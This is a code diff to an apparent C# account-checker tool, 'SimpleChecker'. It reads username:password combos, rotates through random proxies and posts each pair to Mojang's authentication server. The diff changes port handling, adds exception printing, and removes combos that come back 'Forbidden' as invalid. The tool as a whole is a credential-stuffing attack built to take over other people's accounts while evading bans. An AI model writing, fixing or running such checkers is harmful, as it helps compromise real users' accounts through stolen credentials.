@@ -34,21 +34,23 @@ namespace SimpleChecker
                 {
                     string[] proxyandport = GrabProxie().Split(":");
                     string proxy = proxyandport[0];
-                    int port = int.Parse(proxyandport[1]);
+                    string port = proxyandport[1];
                     string[] combo = line.Split(":");
                     Post(proxy, port,combo[0],combo[1]);
                 }
             }
         }
-        public void Post(string proxy, int port, string name, string pwd)
+        public void Post(string proxy, string port, string name, string pwd)
         {
+            Console.ReadKey();
             try
             {
                 //open connection
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://authserver.mojang.com/authenticate");
                 request.Method = "POST";
+                request.Proxy = new WebProxy(proxy,int.Parse(port)); //connect through random proxy
                 request.Timeout = 50; //set proxy alive time
-                request.Proxy = new WebProxy(proxy,port); //connect through random proxy
+
 
                 //set payload
                 // name = "mijaj50792@ualmail.com";
@@ -79,8 +81,9 @@ namespace SimpleChecker
                 }
 
             }
-            catch(System.Net.WebException e)//if the remote server return an unauth response
+            catch(Exception e)//if the remote server return an unauth response
             {
+                Console.WriteLine(e);
                 Console.ForegroundColor  = ConsoleColor.Red; // bad proxie (blanket banned)
                 if (e.ToString().Contains("timed out"))
                 {
@@ -93,8 +96,11 @@ namespace SimpleChecker
                     Console.WriteLine("---[  Removed Proxy  ]---");
                 }else if(e.ToString().Contains("Forbidden")) // bad account
                 {
+                    int removal = combos.IndexOf(name+":"+pwd);
+                    combos.RemoveAt(removal);
                     Console.WriteLine("[Invalid!]\t" + proxy+":"+port+"\t"+name+":"+pwd);
                 }
+                GrabUserandPassword();
             }
         }
     }
